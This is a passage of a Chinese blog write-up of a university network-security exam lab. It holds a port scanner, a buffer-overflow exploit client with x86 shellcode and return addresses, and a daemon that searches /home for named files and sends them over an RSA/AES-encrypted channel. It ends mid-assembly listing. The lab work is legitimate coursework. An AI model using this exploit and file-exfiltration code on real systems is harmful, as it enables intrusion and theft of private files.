         <span class="comment"># 把新建的线程放到线程池</span></span><br><span class="line">            all_threads.append(t)</span><br><span class="line">    <span class="comment"># 循环阻塞主线程，等待每一字子线程执行完，程序再退出</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> all_threads:</span><br><span class="line">        t.join()</span><br><span class="line">    print(routers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket访问IP函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span><span class="params">(new_ip, port)</span>:</span></span><br><span class="line">    <span class="comment"># 创建TCP套接字，链接新的ip列表</span></span><br><span class="line">    scan_link = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment"># 设置链接超时时间</span></span><br><span class="line">    scan_link.settimeout(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 链接地址(通过指定我们 构造的主机地址，和扫描指定端口)</span></span><br><span class="line">    result = scan_link.connect_ex((new_ip, port))</span><br><span class="line">    scan_link.close()</span><br><span class="line">    <span class="comment"># 判断链接结果</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 加锁</span></span><br><span class="line">        lock.acquire()</span><br><span class="line">        print(new_ip, <span class="string">'\t\t端口号%s开放'</span> % port)</span><br><span class="line">        routers.append((new_ip, port))</span><br><span class="line">        <span class="comment"># 释放锁</span></span><br><span class="line">        lock.release()</span><br><span class="line"><span class="comment"># 启动程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    启动扫描程序</span><br><span class="line">    ports=input(<span class="string">"输入想要扫描的端口"</span>)</span><br><span class="line">    port_list = port_list.append(ports.split(<span class="string">' '</span>))</span><br><span class="line">    print(port_list)</span><br><span class="line">    search_routers()</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-正常通信——字符串前后翻转"><a href="#2-2-正常通信——字符串前后翻转" class="headerlink" title="2.2 正常通信——字符串前后翻转"></a>2.2 正常通信——字符串前后翻转</h2><p>与任务一的字符串前后翻转服务端程序交互，发出字符串，然后收到翻转后的字符串并打印</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>): </span><br><span class="line">    input_data = input(<span class="string">"send:"</span>) <span class="comment">#输入要发送的字符串</span></span><br><span class="line">    <span class="keyword">if</span> input_data==<span class="string">"quit"</span>:   <span class="comment">#quit退出socket连接</span></span><br><span class="line">        input_data = <span class="string">b"\x90"</span> * (<span class="number">120</span>)</span><br><span class="line">        clientsocket.send(input_data)  <span class="comment"># 使服务器异常退出停止socket，可用于中止服务器</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    clientsocket.send(input_data.encode(<span class="string">"utf-8"</span>))<span class="comment"># 这里要发字节流</span></span><br><span class="line">    data = clientsocket.recv(<span class="number">1024</span>)  <span class="comment">#收到的翻转字符串</span></span><br><span class="line">    print(<span class="string">"recv:"</span>, data)</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-exploit功能"><a href="#2-3-exploit功能" class="headerlink" title="2.3 exploit功能"></a>2.3 exploit功能</h2><p>发送针对漏洞的payload（包含shellcode）</p>
+<p>shellcode的字节代码已经在全局变量写了，程序通过对我们输入的判断（1234等）来判断我们要用哪种模式。</p>
+<p>工作模式有【1】创建txt文件 【2】发送daemon程序 【3】执行daemon文件 【其他】正常沟通（输入quit退出），其中1~3是exploit攻击，其他的则是正常通信。</p>
+<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621223352350.png" alt="image-20200621223352350"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通信主体函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tans</span><span class="params">(clientsocket)</span>:</span></span><br><span class="line">    print(<span class="string">"connect success"</span>)</span><br><span class="line">    print(<span class="string">"attack_mode：【1】创建txt文件 【2】发送daemon程序 【3】执行daemon文件 【其他】正常沟通（输入quit退出））"</span>)</span><br><span class="line">    attack_mode = input(<span class="string">"请输入attack_mode:"</span>)</span><br><span class="line">    <span class="keyword">if</span> attack_mode == <span class="string">"1"</span>:  <span class="comment"># 【1】创建txt文件</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送"</span>)</span><br><span class="line">        <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"1"</span>))  <span class="comment"># 这里要发字节流</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"2"</span>:  <span class="comment"># 【2】发送daemon程序</span></span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_daemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"2"</span>))  <span class="comment"># 这里要发字节流</span></span><br><span class="line">        data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"3"</span>:  <span class="comment"># 【3】执行daemon文件</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_execdaemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"3"</span>))  <span class="comment"># 这里要发字节流</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 【其他】正常沟通</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            input_data = input(<span class="string">"send:"</span>)</span><br><span class="line">            <span class="keyword">if</span> input_data==<span class="string">"quit"</span>:</span><br><span class="line">                input_data = <span class="string">b"\x90"</span> * (<span class="number">120</span>)</span><br><span class="line">                clientsocket.send(input_data)   <span class="comment"># 使服务器异常退出停止socket，可用于中止服务器</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            clientsocket.send(input_data.encode(<span class="string">"utf-8"</span>))  <span class="comment"># 这里要发字节流形式</span></span><br><span class="line">            data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">            print(<span class="string">"recv:"</span>, data)</span><br><span class="line"><span class="comment">#用于拼接字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_new</span><span class="params">(shellcode_mode)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> shellcode_mode==<span class="string">"2"</span>:</span><br><span class="line">        payload = shellcode_daemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_daemon))</span><br><span class="line">    <span class="keyword">elif</span> shellcode_mode==<span class="string">"3"</span>:</span><br><span class="line">        payload = shellcode_execdaemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_execdaemon))</span><br><span class="line">        print(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = shellcode_createtxt + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_createtxt))</span><br><span class="line">    payload = payload + <span class="string">b'\xcc\xde\xff\xbf\xdc\xde\xff\xbf'</span></span><br><span class="line">    payload = payload + <span class="string">b'\x00'</span></span><br><span class="line">    print(<span class="string">"拼接payload成功"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<h1 id="任务三、daemon程序"><a href="#任务三、daemon程序" class="headerlink" title="任务三、daemon程序"></a>任务三、daemon程序</h1><p><strong>任务三</strong>：利用上述漏洞，把一个自己设计的程序 daemon 送上服务端机器并运行，这个 daemon能够搜索服务器上的所有 txt 文件，并找出文件名中含有你的姓名的文件，并利用网络传送给客户端机器（传出的方法不限，例如：email，在线 socket 连接等）。<strong>（20 分）</strong></p>
+<p>程序 daemon，我使用python编写，能够搜索服务器上的任意指定文件（可以指定为我们的文件名中含有你的姓名的文件），并利用网络传送给客户端。</p>
+<h2 id="3-1-搜索服务器上的任意指定文件"><a href="#3-1-搜索服务器上的任意指定文件" class="headerlink" title="3.1 搜索服务器上的任意指定文件"></a>3.1 搜索服务器上的任意指定文件</h2><p>如下代码所示，其可以在指定的目录下，搜索我们指定文件名的文件，并且将其路径保存在routes中。</p>
+<p>主要是使用了pythond的os库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">routes=[] <span class="comment">#路径数组</span></span><br><span class="line"><span class="comment">#搜索文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(curpath, s)</span>:</span></span><br><span class="line">    L = os.listdir(curpath)  <span class="comment">#列出当前目录下所有文件</span></span><br><span class="line">    <span class="keyword">for</span> subpath <span class="keyword">in</span> L:  <span class="comment">#遍历当前目录所有文件</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(os.path.join(curpath, subpath)):  <span class="comment">#若文件仍为目录，递归查找子目录</span></span><br><span class="line">            newpath = os.path.join(curpath, subpath)</span><br><span class="line">            search(newpath, s)</span><br><span class="line">        <span class="keyword">elif</span> os.path.isfile(os.path.join(curpath, subpath)):  <span class="comment">#若为文件，判断是否包含搜索字串</span></span><br><span class="line">            <span class="keyword">if</span> s <span class="keyword">in</span> subpath:</span><br><span class="line">                routes.append(os.path.join(curpath, subpath))</span><br><span class="line">search(os.path.abspath(<span class="string">'/home'</span>), recvData[<span class="string">"file_name"</span>])</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-2-利用网络传送指定文件给客户端"><a href="#3-2-利用网络传送指定文件给客户端" class="headerlink" title="3.2 利用网络传送指定文件给客户端"></a>3.2 利用网络传送指定文件给客户端</h2><p>如下代码所示，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#根据恶意客户端的要求，做出应答（如搜索发送文件）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_reply</span><span class="params">(recvData)</span>:</span> </span><br><span class="line">    recvData=json.loads(recvData) <span class="comment">#将恶意客户端发送来的数据json格式化</span></span><br><span class="line">    <span class="keyword">if</span> recvData[<span class="string">"Method"</span>]==<span class="string">"get_file"</span>: <span class="comment">#如果是方式Method是get_file，就要搜索发送文件</span></span><br><span class="line">        print(recvData[<span class="string">"file_name"</span>]) </span><br><span class="line">        search(os.path.abspath(<span class="string">'/home'</span>), recvData[<span class="string">"file_name"</span>]) <span class="comment">#搜索指定的文件</span></span><br><span class="line">        print(routes) <span class="comment">#打印找到的路径</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\""</span>+open(routes[<span class="number">0</span>]).read().replace(<span class="string">'\n'</span>, <span class="string">''</span>).replace(<span class="string">'\r'</span>, <span class="string">''</span>)+<span class="string">"\"&#125;"</span> <span class="comment">#返回指定的文件名和内容</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment">#不是get_file，则发hello</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\"hello\"&#125;"</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="任务四、密钥管理机制和传输加密方案"><a href="#任务四、密钥管理机制和传输加密方案" class="headerlink" title="任务四、密钥管理机制和传输加密方案"></a>任务四、密钥管理机制和传输加密方案</h1><p><strong>任务四：</strong>在上述任务的基础上，设计一种密钥管理机制和传输加密方案，模拟将传输内容加密（包含文件名和文件内容）发送给客户端机器。用 wireshark 等工具抓取传输内容，证明未加密与加密的区别，并分析你所设计的密钥管理机制和传输加密方案的安全性。<strong>（10 分）</strong></p>
+<h2 id="4-1-密钥管理机制和传输加密方案"><a href="#4-1-密钥管理机制和传输加密方案" class="headerlink" title="4.1 密钥管理机制和传输加密方案"></a>4.1 密钥管理机制和传输加密方案</h2><p>客户端发送非对称加密RSA公钥给服务端，服务端创建对称加密AES密钥发送给客户端，之后两方通过AES进行通信</p>
+<ul>
+<li><p>首先daemon.py作为服务器（受害方）被shellcode启动</p>
+</li>
+<li><p>客户端（攻击方），启动client.py通过socket连接上该服务器，创建非对称加密RSA密钥，发送公钥和公钥Sha256摘要给服务器</p>
+</li>
+<li><p>服务器（受害方）接收到RSA的公钥和公钥摘要之后，对公钥进行摘要判断，公钥是否被改动。如没有，就产生用于 AES 对称加密的密钥，将其用RSA公钥加密后，将其密文和密文摘要发给客户端（攻击方）</p>
+</li>
+<li><p>客户端（攻击方）同上用对 AES密钥进行摘要，判断是否被改动。如没有，双方便可以用 AES密钥进行通信的加密了。</p>
+</li>
+</ul>
+<h3 id="客户端（攻击方）代码"><a href="#客户端（攻击方）代码" class="headerlink" title="客户端（攻击方）代码"></a>客户端（攻击方）代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># ===========向服务端（daemon）发RSA的公钥及其SHA256摘要=================</span></span><br><span class="line"><span class="comment"># 向服务端传递公钥，和该公钥字符串化后的sha256值</span></span><br><span class="line">   <span class="comment"># 发送的sha256用于校验公钥是否正确</span></span><br><span class="line">   print(<span class="string">"正在向服务器传送 RSA 公钥"</span>)</span><br><span class="line">   sendKey = pickle.dumps(self.publicKey)</span><br><span class="line">   sendKeySha256 = hashlib.sha256(sendKey).hexdigest()</span><br><span class="line">   clientSocket.send(pickle.dumps((sendKey, sendKeySha256)))</span><br><span class="line">   <span class="comment"># ===========接受服务端传递的AES对称密钥，并验证是否被改动，解密==============</span></span><br><span class="line">   <span class="comment"># 接受服务端传递的密钥并进行解密</span></span><br><span class="line">   symKey, symKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">   <span class="keyword">if</span> hashlib.sha256(symKey).hexdigest() != symKeySha256:</span><br><span class="line">       <span class="keyword">raise</span> AuthenticationError(<span class="string">"AES密钥被篡改！"</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       self.symKey = pickle.loads(rsa.decrypt(symKey, self.privateKey))</span><br><span class="line">       print(<span class="string">"AES密钥交换完成"</span>)</span><br><span class="line">   <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">   AES = Fernet(self.symKey)</span><br><span class="line">   <span class="comment"># =====================AES密钥接收成功，下面是业务代码================</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="服务端（daemon）代码"><a href="#服务端（daemon）代码" class="headerlink" title="服务端（daemon）代码"></a>服务端（daemon）代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link_one_client</span><span class="params">(self)</span>:</span></span><br><span class="line">       clientSocket, addr = self.serverSocket.accept() <span class="comment"># 获取客户端对象和客户端地址</span></span><br><span class="line">       print(<span class="string">"和客户端建立连接\n目标主机地址为：&#123;0&#125;"</span>.format(addr))<span class="comment"># 打印</span></span><br><span class="line">       </span><br><span class="line">       <span class="comment"># ===========接收客户端发来的RSA公钥，并验证是否被改动=================</span></span><br><span class="line">       <span class="comment"># 接受客户端传递的公钥,哈希函数检验公钥的正确性,运用pickle进行反序列化</span></span><br><span class="line">       publicKeyPK, pubKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">       <span class="keyword">if</span> hashlib.sha256(publicKeyPK).hexdigest() != pubKeySha256:</span><br><span class="line">           <span class="keyword">raise</span> AuthenticationError(<span class="string">"公钥被篡改！"</span>)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           publicKey = pickle.loads(publicKeyPK)</span><br><span class="line">           print(<span class="string">"已接受公钥"</span>)</span><br><span class="line"></span><br><span class="line">       <span class="comment"># ===========下面是用RSA公钥加密AES对称密钥，发送密文及其SHA256摘要的过程=======</span></span><br><span class="line">       <span class="comment"># 产生用于 AES 对称加密的密钥</span></span><br><span class="line">       sym_key = Fernet.generate_key()</span><br><span class="line">       <span class="comment"># 用pickle进行序列化用来进行网络传输</span></span><br><span class="line">       <span class="comment"># 对密钥进行hash保证其准确性</span></span><br><span class="line">       en_sym_key = rsa.encrypt(pickle.dumps(sym_key), publicKey)</span><br><span class="line">       en_sym_key_sha256 = hashlib.sha256(en_sym_key).hexdigest()</span><br><span class="line">       print(<span class="string">"正在加密传送AES对称密钥"</span>) <span class="comment">#发送AES密钥以及AES密钥的摘要</span></span><br><span class="line">       clientSocket.send(pickle.dumps((en_sym_key,en_sym_key_sha256)))</span><br><span class="line"></span><br><span class="line">       <span class="comment"># =====================AES密钥发送成功，下面是业务代码================</span></span><br><span class="line">       print(<span class="string">"密钥交换结束"</span>)</span><br><span class="line">       <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">       AES = Fernet(sym_key)</span><br><span class="line">       <span class="comment"># 下面使用AES对称密钥进行加密对话的过程</span></span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           time.sleep(<span class="number">0.3</span>)</span><br><span class="line">           recvData = clientSocket.recv(<span class="number">1024</span>) <span class="comment"># 接收到的消息</span></span><br><span class="line"></span><br><span class="line">           <span class="comment"># ============接收解密=================</span></span><br><span class="line">           recvData = AES.decrypt(recvData).decode()  <span class="comment">#接收解密</span></span><br><span class="line">           <span class="comment"># ================不解密=================</span></span><br><span class="line">           <span class="comment">#recvData = recvData.decode()</span></span><br><span class="line"></span><br><span class="line">           print(<span class="string">"接受到客户端传来的消息：&#123;0&#125;"</span>.format(recvData))</span><br><span class="line">           sendData = get_reply(recvData)<span class="comment">#调用回复函数来判断</span></span><br><span class="line">           </span><br><span class="line">           <span class="comment"># ============加密发送=================</span></span><br><span class="line">            sendData = AES.encrypt(sendData.encode())<span class="comment"># 对消息进行加密</span></span><br><span class="line">            clientSocket.send(sendData)</span><br><span class="line">           <span class="comment"># ===============不加密=================</span></span><br><span class="line">           <span class="comment">#clientSocket.send(sendData.encode())</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="4-2-用-wireshark-等工具抓取传输内容，证明未加密与加密的区别"><a href="#4-2-用-wireshark-等工具抓取传输内容，证明未加密与加密的区别" class="headerlink" title="4.2 用 wireshark 等工具抓取传输内容，证明未加密与加密的区别"></a>4.2 用 wireshark 等工具抓取传输内容，证明未加密与加密的区别</h2><p>首先我们先把daemon.py和client.py的加密关掉，启动后client向daemon请求LinFengLv.txt。</p>
+<p>可以看到如果传输文件内容未加密，则wireshark 抓取到socket发送的包，可以直接在data部分看到<strong>传输内容明文</strong></p>
+<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023021090.png" alt="image-20200622023021090"></p>
+<p>我们开启加密</p>
+<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023250674.png" alt="image-20200622023250674"></p>
+<p>如下，如果传输文件内容加密，则抓取到的包，data部分是密文，无法被破译。</p>
+<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023111428.png" alt="image-20200622023111428"></p>
+<h2 id="4-3-分析密钥管理和传输加密方案的安全性"><a href="#4-3-分析密钥管理和传输加密方案的安全性" class="headerlink" title="4.3 分析密钥管理和传输加密方案的安全性"></a>4.3 分析密钥管理和传输加密方案的安全性</h2><ul>
+<li><p>首先daemon.py作为服务器（受害方）被shellcode启动</p>
+</li>
+<li><p>客户端（攻击方），启动client.py通过socket连接上该服务器，创建非对称加密RSA密钥，发送公钥和公钥Sha256摘要给服务器</p>
+</li>
+<li><p>服务器（受害方）接收到RSA的公钥和公钥摘要之后，对公钥进行摘要判断，公钥是否被改动。如没有，就产生用于 AES 对称加密的密钥，将其用RSA公钥加密后，将其密文和密文摘要发给客户端（攻击方）</p>
+</li>
+<li><p>客户端（攻击方）同上用对 AES密钥进行摘要，判断是否被改动。如没有，双方便可以用 AES密钥进行通信的加密了。</p>
+</li>
+</ul>
+<p><strong>分析：</strong></p>
+<p>方案：客户端创建并发送非对称加密RSA公钥给服务端，服务端创建对称加密AES密钥发送给客户端，之后两方通过AES进行通信。</p>
+<ul>
+<li>可以有效保障传输内容的保密性：方案采用了AES对称加密通信的内容，并且使用了非对称加密RSA来对AES密钥进行加密</li>
+<li>防止传输密钥时的中间人攻击：在传输RSA的公钥、传输AES的密钥时，同时都会发送其对应的Sha256哈希摘要，通过摘要验证的方式防止传输密钥包时的中间人改动攻击。</li>
+<li>时效性强，防止重放攻击：由于我们的daemon服务端是shellcode启动的，主要功能是为客户端（攻击方）搜索发送指定的文件（姓名.txt），所以很快就关闭了。在交换密钥完成之后，就发送文件完毕。这些操作都是在很短的时间内完成的（所以消息中没有加入时间戳），而每次daemon服务端的启动，客户端都需要与其重新创建密钥并且交换密钥，密钥的产生很随机。时效性很强，可以有效的方式重放攻击。</li>
+</ul>
+<h1 id="五、Shellcode介绍"><a href="#五、Shellcode介绍" class="headerlink" title="五、Shellcode介绍"></a>五、Shellcode介绍</h1><h2 id="5-1-创建-学号-txt"><a href="#5-1-创建-学号-txt" class="headerlink" title="5.1 创建 学号.txt"></a>5.1 创建 学号.txt</h2><p>主要是利用了linux中的系统调用int 80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数,从 <code>/usr/include/asm/unistd.h</code>中可以看到。</p>
+<p>在本shellcode中我们的操作如下</p>
+<ul>
+<li>首先5号调用open系统调用，创建文件<code>LinFengLv.txt</code></li>
+<li>然后4号调用write系统调用，写文件内容<code>2017301500076</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd.h | less总共有383条</span><br><span class="line">#define __NR_exit                 1</span><br><span class="line">#define __NR_fork                 2</span><br><span class="line">#define __NR_read                 3</span><br><span class="line">#define __NR_write                4 &lt;------2 写文件内容&#96;2017301500076&#96;</span><br><span class="line">#define __NR_open                 5 &lt;------1 创建文件&#96;LinFengLv.txt&#96;</span><br><span class="line">#define __NR_close                6 </span><br><span class="line">#define __NR_waitpid              7</span><br><span class="line">#define __NR_creat                8</span><br><span class="line">#define __NR_link                 9</span><br><span class="line">#define __NR_unlink              10</span><br><span class="line">#define __NR_execve              11</span><br></pre></td></tr></table></figure>
+
+<p>以32位linux为例（64位下系统调用号是不同的）：</p>
+<p><strong>打开文件的调用号</strong>为5，将5存入eax，ebx存入文件路径字符串的首地址，ecx存入打开方式，只读为“0”，写为“03101”，edx存入权限集合，现在存入“0666”就行了，反正我不懂unix的权限。打开成功后，系统会返回该文件的“文件标识符”,在eax里面。之后全程都要用这个文件标识符指代打开的那个文件。</p>
+<p>读取文件的调用号为3，存入eax，文件标识符存入ebx，在此之前，要划一个缓存区，用来储存读取的数据，将该缓存区的首地址存入ecx，长度存入edx。读取成功后，会按照edx中的长度填充缓存区，就是edx的值是多少，就填充多少（当然，由文件的长度而定），返回已经读取的长度。</p>
+<p><strong>写入文件的调用号</strong>为4，存入eax，其余参数同上。返回写入的字节数或者错误代码（写入失败），存入eax。</p>
+<p>关闭文件的调用号为6，存入eax，文件描述符存入ebx。只有这两个参数。</p>
+<p><strong>字节码和汇编代码如下，注释了</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">;################字节码#############</span><br><span class="line">;shellcode_createtxt&#x3D;b&#39;\x31\xc0\xb0\xa0\x29\xc4\x31\xd2\x31\xc9\x66\xba\xff\x01\x66\xb9\x41\x06\x31\xdb\x53\x68\x2e\x74\x78\x74\x68\x6e\x67\x4c\x76\x68\x69\x6e\x46\x65\x68\x2e\x2f\x2f\x4c\x89\xe3\x31\xc0\xb0\x05\xcd\x80\x31\xdb\x53\x6a\x36\x68\x30\x30\x30\x37\x68\x33\x30\x31\x35\x68\x32\x30\x31\x37\x89\xe1\x89\xc3\x31\xd2\xb2\x0d\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x31\xc0\xb0\x01\xcd\x80&#39;</span><br><span class="line">;################字节码#############</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;抬高栈顶指针esp避免影响代码&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0xA0</span><br><span class="line">sub esp,eax</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;open系统调用，创建文件&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">;linux中openfile可以用于创建文件</span><br><span class="line"></span><br><span class="line">xor edx,edx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov dx, 777q  ;文件的权限集合存入edx</span><br><span class="line">mov cx, 3101q ;文件的打开方式存入ecx</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push &quot;.txt&quot;</span><br><span class="line">push &quot;ngLv&quot;</span><br><span class="line">push 